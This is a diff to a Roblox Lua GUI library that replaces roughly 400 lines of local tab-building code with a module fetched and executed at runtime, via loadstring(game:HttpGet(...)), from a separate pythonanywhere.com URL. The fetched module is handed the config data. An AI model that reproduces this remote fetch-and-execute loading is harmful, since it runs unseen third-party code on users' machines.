@@ -6,11 +6,13 @@ local LocalPlayer = Players.LocalPlayer
 
 local BASE = "https://raw.githubusercontent.com/nhfudzfsrzggt/brigida/refs/heads/main/"
 local function load(path) return loadstring(game:HttpGet(BASE .. path))() end
+local function loadUrl(url) return loadstring(game:HttpGet(url))() end
 
 local ColorModule    = load("src/elements/color.lua")
 local ElementsModule = load("src/elements/Elements.lua")
 local KeybindModule  = load("src/elements/keybind.lua")
 local DialogModule   = load("src/elements/dialog.lua")
+local TabsModule     = loadUrl("https://fitri324.pythonanywhere.com/Tabs.lua/raw")
 
 local defaultIcons = load("src/elements/icon/basic.lua")
 local lucideIcons  = load("src/elements/icon/lucide.lua")
@@ -2023,7 +2025,6 @@ function Chloex:Window(GuiConfig)
     DropdownSelect.ClipsDescendants = true
     DropdownSelect.Parent = MoreBlur
 
-    -- ==================== DROPDOWN CLOSE ANIMATION ====================
     ConnectButton.Activated:Connect(function()
         if MoreBlur.Visible then
             TweenService:Create(DropdownSelect, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
@@ -2036,7 +2037,6 @@ function Chloex:Window(GuiConfig)
             MoreBlur.Visible = false
         end
     end)
-    -- ==================== END DROPDOWN CLOSE ANIMATION ====================
 
     UICorner36.CornerRadius = UDim.new(0, 6)
     UICorner36.Parent = DropdownSelect
@@ -2069,435 +2069,34 @@ function Chloex:Window(GuiConfig)
     DropPageLayout.Name = "DropPageLayout"
     DropPageLayout.Parent = DropdownFolder
 
-    --// Tabs
-    local Tabs = GuiFunc
-    local CountTab = 0
-    local CountDropdown = 0
+    -- ==================== LOAD TABS FROM EXTERNAL ====================
+    local Tabs = TabsModule(
+        GuiConfig,
+        LayersFolder,
+        LayersPageLayout,
+        _G.ScrollTab,
+        NameTab,
+        MoreBlur,
+        DropdownFolder,
+        DropdownSelect,
+        DropPageLayout,
+        Elements,
+        ElementsModule,
+        KeybindModule,
+        Mouse,
+        TweenService,
+        getIconId,
+        CircleClick,
+        SaveConfig,
+        ConfigData
+    )
 
-    function Tabs:AddTab(TabConfig)
-        local TabConfig = TabConfig or {}
-        TabConfig.Name = TabConfig.Name or "Tab"
-        TabConfig.Icon = TabConfig.Icon or ""
-
-        local ScrolLayers   = Instance.new("ScrollingFrame")
-        local UIListLayout1 = Instance.new("UIListLayout")
-
-        ScrolLayers.ScrollBarImageColor3 = Color3.fromRGB(80, 80, 80)
-        ScrolLayers.ScrollBarThickness = 0
-        ScrolLayers.Active = true
-        ScrolLayers.LayoutOrder = CountTab
-        ScrolLayers.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        ScrolLayers.BackgroundTransparency = 0.999
-        ScrolLayers.BorderColor3 = Color3.fromRGB(0, 0, 0)
-        ScrolLayers.BorderSizePixel = 0
-        ScrolLayers.Size = UDim2.new(1, 0, 1, 0)
-        ScrolLayers.Name = "ScrolLayers"
-        ScrolLayers.Parent = LayersFolder
-
-        UIListLayout1.Padding = UDim.new(0, 3)
-        UIListLayout1.SortOrder = Enum.SortOrder.LayoutOrder
-        UIListLayout1.Parent = ScrolLayers
-
-        local Tab        = Instance.new("Frame")
-        local UICorner3  = Instance.new("UICorner")
-        local TabButton  = Instance.new("TextButton")
-        local TabName    = Instance.new("TextLabel")
-        local FeatureImg = Instance.new("ImageLabel")
-        local UIStroke2  = Instance.new("UIStroke")
-        local UICorner4  = Instance.new("UICorner")
-
-        Tab.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        if CountTab == 0 then
-            Tab.BackgroundTransparency = 0.92
-        else
-            Tab.BackgroundTransparency = 0.999
-        end
-        Tab.BorderColor3 = Color3.fromRGB(0, 0, 0)
-        Tab.BorderSizePixel = 0
-        Tab.LayoutOrder = CountTab
-        Tab.Size = UDim2.new(1, 0, 0, 30)
-        Tab.Name = "Tab"
-        Tab.Parent = _G.ScrollTab
-
-        UICorner3.CornerRadius = UDim.new(0, 4)
-        UICorner3.Parent = Tab
-
-        TabButton.Font = Enum.Font.GothamBold
-        TabButton.Text = ""
-        TabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-        TabButton.TextSize = 13
-        TabButton.TextXAlignment = Enum.TextXAlignment.Left
-        TabButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        TabButton.BackgroundTransparency = 0.999
-        TabButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-        TabButton.BorderSizePixel = 0
-        TabButton.Size = UDim2.new(1, 0, 1, 0)
-        TabButton.Name = "TabButton"
-        TabButton.Parent = Tab
-
-        TabName.Font = Enum.Font.GothamBold
-        TabName.Text = "| " .. tostring(TabConfig.Name)
-        TabName.TextColor3 = Color3.fromRGB(255, 255, 255)
-        TabName.TextSize = 13
-        TabName.TextXAlignment = Enum.TextXAlignment.Left
-        TabName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        TabName.BackgroundTransparency = 0.999
-        TabName.BorderColor3 = Color3.fromRGB(0, 0, 0)
-        TabName.BorderSizePixel = 0
-        TabName.Size = UDim2.new(1, 0, 1, 0)
-        TabName.Position = UDim2.new(0, 30, 0, 0)
-        TabName.Name = "TabName"
-        TabName.Parent = Tab
-
-        FeatureImg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        FeatureImg.BackgroundTransparency = 0.999
-        FeatureImg.BorderColor3 = Color3.fromRGB(0, 0, 0)
-        FeatureImg.BorderSizePixel = 0
-        FeatureImg.Position = UDim2.new(0, 9, 0, 7)
-        FeatureImg.Size = UDim2.new(0, 16, 0, 16)
-        FeatureImg.Name = "FeatureImg"
-        FeatureImg.Parent = Tab
-
-        if TabConfig.Icon and TabConfig.Icon ~= "" then
-            local iconId = getIconId(TabConfig.Icon)
-            if iconId and iconId ~= "" then
-                FeatureImg.Image = iconId
-            end
-        end
-
-        if CountTab == 0 then
-            LayersPageLayout:JumpToIndex(0)
-            NameTab.Text = TabConfig.Name
-            local ChooseFrame = Instance.new("Frame")
-            ChooseFrame.BackgroundColor3 = GuiConfig.Color
-            ChooseFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
-            ChooseFrame.BorderSizePixel = 0
-            ChooseFrame.Position = UDim2.new(0, 2, 0, 9)
-            ChooseFrame.Size = UDim2.new(0, 1, 0, 12)
-            ChooseFrame.Name = "ChooseFrame"
-            ChooseFrame.Parent = Tab
-
-            UIStroke2.Color = GuiConfig.Color
-            UIStroke2.Thickness = 1.6
-            UIStroke2.Parent = ChooseFrame
-
-            UICorner4.Parent = ChooseFrame
-        end
-
-        TabButton.Activated:Connect(function()
-            CircleClick(TabButton, Mouse.X, Mouse.Y)
-            local FrameChoose
-            for a, s in _G.ScrollTab:GetChildren() do
-                for i, v in s:GetChildren() do
-                    if v.Name == "ChooseFrame" then
-                        FrameChoose = v
-                        break
-                    end
-                end
-            end
-            if FrameChoose ~= nil and Tab.LayoutOrder ~= LayersPageLayout.CurrentPage.LayoutOrder then
-                for _, TabFrame in _G.ScrollTab:GetChildren() do
-                    if TabFrame.Name == "Tab" then
-                        TweenService:Create(TabFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.InOut), { BackgroundTransparency = 0.999 }):Play()
-                    end
-                end
-                TweenService:Create(Tab, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.InOut), { BackgroundTransparency = 0.92 }):Play()
-                TweenService:Create(FrameChoose, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), { Position = UDim2.new(0, 2, 0, 9 + (33 * Tab.LayoutOrder)) }):Play()
-                LayersPageLayout:JumpToIndex(Tab.LayoutOrder)
-                task.wait(0.05)
-                NameTab.Text = TabConfig.Name
-                TweenService:Create(FrameChoose, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), { Size = UDim2.new(0, 1, 0, 20) }):Play()
-                task.wait(0.2)
-                TweenService:Create(FrameChoose, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), { Size = UDim2.new(0, 1, 0, 12) }):Play()
-            end
-        end)
-
-        local Sections = {}
-        local CountSection = 0
-
-        function Sections:AddSection(SectionConfig)
-            local Title = "Section"
-            local Icon = ""
-            local Open = false
-
-            if type(SectionConfig) == "string" then
-                Title = SectionConfig
-            elseif type(SectionConfig) == "table" then
-                Title = SectionConfig.Title or "Section"
-                Icon  = SectionConfig.Icon or ""
-                Open  = SectionConfig.Open or false
-            end
-
-            local Section            = Instance.new("Frame")
-            local SectionDecideFrame = Instance.new("Frame")
-            local UICorner1          = Instance.new("UICorner")
-            local UIGradient         = Instance.new("UIGradient")
-
-            Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-            Section.BackgroundTransparency = 0.999
-            Section.BorderSizePixel = 0
-            Section.LayoutOrder = CountSection
-            Section.ClipsDescendants = true
-            Section.Size = UDim2.new(1, 0, 0, 30)
-            Section.Name = "Section"
-            Section.Parent = ScrolLayers
-
-            local SectionReal   = Instance.new("Frame")
-            local UICorner      = Instance.new("UICorner")
-            local SectionButton = Instance.new("TextButton")
-            local FeatureFrame  = Instance.new("Frame")
-            local FeatureImg    = Instance.new("ImageLabel")
-            local SectionTitle  = Instance.new("TextLabel")
-            local SectionIcon   = Instance.new("ImageLabel")
-
-            SectionReal.AnchorPoint = Vector2.new(0.5, 0)
-            SectionReal.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-            SectionReal.BackgroundTransparency = 0.935
-            SectionReal.BorderSizePixel = 0
-            SectionReal.Position = UDim2.new(0.5, 0, 0, 0)
-            SectionReal.Size = UDim2.new(1, -2, 0, 30)
-            SectionReal.Name = "SectionReal"
-            SectionReal.Parent = Section
-
-            UICorner.CornerRadius = UDim.new(0, 4)
-            UICorner.Parent = SectionReal
-
-            if Icon and Icon ~= "" then
-                SectionIcon.BackgroundTransparency = 0.999
-                SectionIcon.BorderSizePixel = 0
-                SectionIcon.Position = UDim2.new(0, 10, 0.5, -8)
-                SectionIcon.Size = UDim2.new(0, 16, 0, 16)
-                SectionIcon.Name = "SectionIcon"
-                SectionIcon.Parent = SectionReal
-                local iconId = getIconId(Icon)
-                if iconId and iconId ~= "" then
-                    SectionIcon.Image = iconId
-                end
-            end
-
-            SectionButton.Font = Enum.Font.SourceSans
-            SectionButton.Text = ""
-            SectionButton.BackgroundTransparency = 0.999
-            SectionButton.BorderSizePixel = 0
-            SectionButton.Size = UDim2.new(1, 0, 1, 0)
-            SectionButton.Name = "SectionButton"
-            SectionButton.Parent = SectionReal
-
-            FeatureFrame.AnchorPoint = Vector2.new(1, 0.5)
-            FeatureFrame.BackgroundTransparency = 0.999
-            FeatureFrame.BorderSizePixel = 0
-            FeatureFrame.Position = UDim2.new(1, -5, 0.5, 0)
-            FeatureFrame.Size = UDim2.new(0, 20, 0, 20)
-            FeatureFrame.Name = "FeatureFrame"
-            FeatureFrame.Parent = SectionReal
-
-            FeatureImg.Image = "rbxassetid://16851841101"
-            FeatureImg.AnchorPoint = Vector2.new(0.5, 0.5)
-            FeatureImg.BackgroundTransparency = 0.999
-            FeatureImg.BorderSizePixel = 0
-            FeatureImg.Position = UDim2.new(0.5, 0, 0.5, 0)
-            FeatureImg.Rotation = -90
-            FeatureImg.Size = UDim2.new(1, 6, 1, 6)
-            FeatureImg.Name = "FeatureImg"
-            FeatureImg.Parent = FeatureFrame
-
-            local alignMap = {
-                Left   = Enum.TextXAlignment.Left,
-                Center = Enum.TextXAlignment.Center,
-                Right  = Enum.TextXAlignment.Right,
-            }
-
-            SectionTitle.Font = Enum.Font.GothamBold
-            SectionTitle.Text = Title
-            SectionTitle.TextColor3 = Color3.fromRGB(230, 230, 230)
-            SectionTitle.TextSize = 13
-            SectionTitle.TextXAlignment = (type(SectionConfig) == "table" and alignMap[SectionConfig.TextXAlignment]) or Enum.TextXAlignment.Left
-            SectionTitle.TextYAlignment = Enum.TextYAlignment.Top
-            SectionTitle.AnchorPoint = Vector2.new(0, 0.5)
-            SectionTitle.BackgroundTransparency = 0.999
-            SectionTitle.BorderSizePixel = 0
-            if Icon and Icon ~= "" then
-                SectionTitle.Position = UDim2.new(0, 32, 0.5, 0)
-            else
-                SectionTitle.Position = UDim2.new(0, 10, 0.5, 0)
-            end
-            SectionTitle.Size = UDim2.new(1, -50, 0, 13)
-            SectionTitle.Name = "SectionTitle"
-            SectionTitle.Parent = SectionReal
-
-            SectionDecideFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-            SectionDecideFrame.AnchorPoint = Vector2.new(0.5, 0)
-            SectionDecideFrame.BorderSizePixel = 0
-            SectionDecideFrame.Position = UDim2.new(0.5, 0, 0, 33)
-            SectionDecideFrame.Size = UDim2.new(0, 0, 0, 2)
-            SectionDecideFrame.Name = "SectionDecideFrame"
-            SectionDecideFrame.Parent = Section
-
-            UICorner1.Parent = SectionDecideFrame
-
-            UIGradient.Color = ColorSequence.new {
-                ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 20)),
-                ColorSequenceKeypoint.new(0.5, GuiConfig.Color),
-                ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 20))
-            }
-            UIGradient.Parent = SectionDecideFrame
-
-            local SectionAdd    = Instance.new("Frame")
-            local UICorner8     = Instance.new("UICorner")
-            local UIListLayout2 = Instance.new("UIListLayout")
-
-            SectionAdd.AnchorPoint = Vector2.new(0.5, 0)
-            SectionAdd.BackgroundTransparency = 0.999
-            SectionAdd.BorderSizePixel = 0
-            SectionAdd.ClipsDescendants = true
-            SectionAdd.LayoutOrder = 1
-            SectionAdd.Position = UDim2.new(0.5, 0, 0, 38)
-            SectionAdd.Size = UDim2.new(1, 0, 0, 100)
-            SectionAdd.Name = "SectionAdd"
-            SectionAdd.Parent = Section
-
-            UICorner8.CornerRadius = UDim.new(0, 2)
-            UICorner8.Parent = SectionAdd
-
-            UIListLayout2.Padding = UDim.new(0, 3)
-            UIListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
-            UIListLayout2.Parent = SectionAdd
-
-            local OpenSection = Open
-
-            local function UpdateSizeScroll()
-                local OffsetY = 0
-                for _, child in ScrolLayers:GetChildren() do
-                    if child.Name ~= "UIListLayout" then
-                        OffsetY = OffsetY + 3 + child.Size.Y.Offset
-                    end
-                end
-                ScrolLayers.CanvasSize = UDim2.new(0, 0, 0, OffsetY)
-            end
-
-            local function UpdateSizeSection()
-                if OpenSection then
-                    local SectionSizeYWitdh = 38
-                    for _, v in SectionAdd:GetChildren() do
-                        if v.Name ~= "UIListLayout" and v.Name ~= "UICorner" then
-                            SectionSizeYWitdh = SectionSizeYWitdh + v.Size.Y.Offset + 3
-                        end
-                    end
-                    TweenService:Create(FeatureImg, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Rotation = 0 }):Play()
-                    TweenService:Create(Section, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = UDim2.new(1, 1, 0, SectionSizeYWitdh) }):Play()
-                    TweenService:Create(SectionAdd, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = UDim2.new(1, 0, 0, SectionSizeYWitdh - 38) }):Play()
-                    TweenService:Create(SectionDecideFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = UDim2.new(1, 0, 0, 2) }):Play()
-                    task.delay(0.25, UpdateSizeScroll)
-                end
-            end
-
-            if OpenSection then UpdateSizeSection() end
-
-            SectionButton.Activated:Connect(function()
-                CircleClick(SectionButton, Mouse.X, Mouse.Y)
-                OpenSection = not OpenSection
-                if OpenSection then
-                    TweenService:Create(SectionTitle, TweenInfo.new(0.2), { TextColor3 = GuiConfig.Color }):Play()
-                    UpdateSizeSection()
-                else
-                    TweenService:Create(SectionTitle, TweenInfo.new(0.2), { TextColor3 = Color3.fromRGB(230, 230, 230) }):Play()
-                    TweenService:Create(FeatureImg, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Rotation = -90 }):Play()
-                    TweenService:Create(Section, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = UDim2.new(1, 1, 0, 30) }):Play()
-                    TweenService:Create(SectionDecideFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = UDim2.new(0, 0, 0, 2) }):Play()
-                    task.delay(0.25, UpdateSizeScroll)
-                end
-            end)
-
-            SectionAdd.ChildAdded:Connect(function()
-                task.wait(0.05)
-                UpdateSizeSection()
-            end)
-            SectionAdd.ChildRemoved:Connect(function()
-                task.wait(0.05)
-                UpdateSizeSection()
-            end)
-
-            local layout = ScrolLayers:FindFirstChildOfClass("UIListLayout")
-            if layout then
-                layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-                    ScrolLayers.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
-                end)
-            end
-
-            local Items = {}
-            local CountItem = 0
-
-            function Items:AddParagraph(ParagraphConfig)
-                local func = ElementsModule:CreateParagraph(SectionAdd, ParagraphConfig, CountItem)
-                CountItem = CountItem + 1
-                return func
-            end
-
-            function Items:AddPanel(PanelConfig)
-                local func = ElementsModule:CreatePanel(SectionAdd, PanelConfig, CountItem)
-                CountItem = CountItem + 1
-                return func
-            end
-
-            function Items:AddButton(ButtonConfig)
-                ElementsModule:CreateButton(SectionAdd, ButtonConfig, CountItem)
-                CountItem = CountItem + 1
-            end
-
-            function Items:AddToggle(ToggleConfig)
-                local func = ElementsModule:CreateToggle(SectionAdd, ToggleConfig, CountItem, UpdateSizeSection, Elements)
-                CountItem = CountItem + 1
-                return func
-            end
-
-            function Items:AddSlider(SliderConfig)
-                local func = ElementsModule:CreateSlider(SectionAdd, SliderConfig, CountItem, UpdateSizeSection, Elements)
-                CountItem = CountItem + 1
-                return func
-            end
-
-            function Items:AddInput(InputConfig)
-                local func = ElementsModule:CreateInput(SectionAdd, InputConfig, CountItem, UpdateSizeSection, Elements)
-                CountItem = CountItem + 1
-                return func
-            end
-
-            function Items:AddDropdown(DropdownConfig)
-                local func = ElementsModule:CreateDropdown(SectionAdd, DropdownConfig, CountItem, CountDropdown, DropdownFolder, MoreBlur, DropdownSelect, DropPageLayout, Elements)
-                CountItem = CountItem + 1
-                CountDropdown = CountDropdown + 1
-                return func
-            end
-
-            function Items:AddDivider()
-                local divider = ElementsModule:CreateDivider(SectionAdd, CountItem)
-                CountItem = CountItem + 1
-                return divider
-            end
-
-            function Items:AddSubSection(title)
-                local subsection = ElementsModule:CreateSubSection(SectionAdd, title, CountItem)
-                CountItem = CountItem + 1
-                return subsection
-            end
-
-            function Items:AddKeybind(KeybindConfig)
-                local func = KeybindModule:CreateKeybind(SectionAdd, KeybindConfig, CountItem, Elements)
-                CountItem = CountItem + 1
-                return func
-            end
-
-            CountSection = CountSection + 1
-            return Items
-        end
-
-        CountTab = CountTab + 1
-        local safeName = TabConfig.Name:gsub("%s+", "_")
-        _G[safeName] = Sections
-        return Sections
+    for k, v in pairs(Tabs) do
+        GuiFunc[k] = v
     end
+    -- ==================== END LOAD TABS ====================
 
-    return Tabs
+    return GuiFunc
 end
 
 VelarisUI = Chloex
